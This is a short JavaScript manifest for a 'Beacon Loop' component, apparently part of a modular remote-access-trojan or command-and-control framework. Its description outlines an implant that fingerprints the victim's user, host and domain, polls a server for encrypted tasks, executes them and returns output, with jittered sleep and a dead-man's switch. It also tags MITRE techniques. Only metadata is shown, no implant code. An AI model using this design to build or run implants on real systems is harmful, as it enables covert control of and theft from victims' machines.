const manifest = {
  "title": "Beacon Loop",
  "component_type": "main",
  "author": "ph3eds",
  "description": "Main beacon loop. Builds rat_id as base64(rand5:imp_id:username:hostname:domain). Polls station for encrypted tasks, decrypts, executes, encrypts output, submits. Dead-man's switch exits after 10 hours of no tasks. Jittered sleep between polls.",
  "mitre": [
    "T1071.001",
    "T1573.001"
  ],
  "references": [],
  "parameters": [],
  "cargo_deps": {
    "base64": "0.22",
    "rand": "0.8"
  }
}
export { manifest }
